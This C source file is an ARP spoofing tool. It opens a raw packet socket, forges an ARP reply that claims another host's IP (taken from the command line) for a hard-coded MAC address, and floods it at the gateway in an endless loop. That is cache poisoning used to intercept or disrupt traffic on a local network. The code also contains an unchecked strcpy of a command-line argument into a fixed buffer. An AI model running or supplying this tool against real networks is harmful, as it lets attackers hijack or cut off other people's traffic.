//  greeshma243@gmail.com
#include <sys/socket.h>
#include <sys/ioctl.h>
#include<unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>


struct arphdr
{
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

int main(int argc,char* argv[])
{
	int sfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	char  interface[40];
	strcpy (interface, argv[5]);
	if(sfd==-1)
	{
		perror("socket");
	}
	char* buf = (char*)malloc(1500);
	uint8_t src[6],dst[6];

	src[0] = 0x40;	
	src[1] = 0xb0;
	src[2] = 0x34;
	src[3] = 0xbf;
	src[4] = 0xec;
	src[5] = 0xa2;

	// Gateway
	dst[0] = 0xC8;
	dst[1] = 0xD9;
	dst[2] = 0xD2;
	dst[3] = 0xA9;
	dst[4] = 0xF5;
	dst[5] = 0x80;
	
	memcpy(buf, dst, 6*(sizeof (uint8_t)));
	memcpy(buf + 6 * (sizeof (uint8_t)), src, 6 * (sizeof (uint8_t)));
	
	buf[12] = ETH_P_ARP / 256;
	buf[13] = ETH_P_ARP % 256;
	
	struct arphdr* arp = (struct arphdr*)(buf + 14);
	arp->htype = htons(1);
	arp->ptype = 8;
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(2);
	
	memcpy(arp->sender_mac ,src,6*(sizeof(uint8_t)));
	memcpy(arp->target_mac ,dst,6*(sizeof(uint8_t)));
	
	// Someone else's IP
	arp->sender_ip[0] = atoi(argv[1]);
	arp->sender_ip[1] = atoi(argv[2]);
	arp->sender_ip[2] = atoi(argv[3]);
	arp->sender_ip[3] = atoi(argv[4]);
	
	arp->target_ip[0] = 192;
	arp->target_ip[1] = 168;
	arp->target_ip[2] = 100;
	arp->target_ip[3] = 101;
	
	memcpy(buf+14,arp,28);
	
	int bytes;
	struct sockaddr_ll device;
	memset (&device, 0, sizeof (device));
	if((device.sll_ifindex = if_nametoindex (interface)) == 0) 
	{
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}
	printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
    
    device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, dst, 6 * sizeof (uint8_t));
	device.sll_halen = 6;
	
	printf("%hhu:",dst[0]);
	printf("%hhu:",dst[1]);
	printf("%hhu:",dst[2]);
	printf("%hhu:",dst[3]);
	printf("%hhu:",dst[4]);
	printf("%hhu\n",dst[5]);
			    
	while(1)		    
	{
		if((bytes = sendto (sfd, buf,42, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) 
		{
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		}
	}
}